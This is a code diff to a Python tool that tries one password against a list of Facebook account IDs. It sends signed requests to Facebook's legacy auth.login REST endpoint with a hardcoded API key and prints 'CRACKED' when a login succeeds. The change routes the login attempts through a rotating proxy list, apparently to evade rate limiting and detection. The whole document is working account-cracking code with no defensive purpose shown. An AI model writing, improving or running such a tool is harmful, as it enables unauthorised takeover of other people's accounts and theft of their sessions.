@@ -5,7 +5,7 @@ import os
 import sys
 import hashlib
 import requests
-
+import libs.proxy as proxy
 if sys.platform == "linux2":
 	os.system("clear")
 elif sys.platform == "win32":
@@ -43,15 +43,19 @@ try:
 		count = 0
 		length = len(open(idlist,'r').read().split("\n"))
 		result = open("result.txt", "a")
+		prox = proxy.proxy()
+		prox.getProxyList()
 		for id in open(idlist,'r').read().split("\n"):
 			print("[*] Trying id {} ({}-{})".format(id,count+1,length))
 			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+id+"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+password+"return_ssl_resources=0v=1.0"+API_SECRET
 			xx = hashlib.md5(sig.encode(encoding="UTF-8",errors="strict")).hexdigest()
 			data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON","generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":password,"return_ssl_resources":"0","v":"1.0","sig":xx}
-			r = requests.get("https://api.facebook.com/restserver.php",params=data)
+			req = [{"https://api.facebook.com/restserver.php":{"GET":data}}]
+			prox.setReq(req)
+			prox.doRequests()
 			# Another error handle response:
 			# if r.json()["error_msg"] != None or r.json()["error"]["message"] == "An unknown error occurred":
-			if "error" in r.text:
+			if "error" in prox.reqContent[0].text:
 				pass
 			else:
 				print("\a======== CRACKED =========")
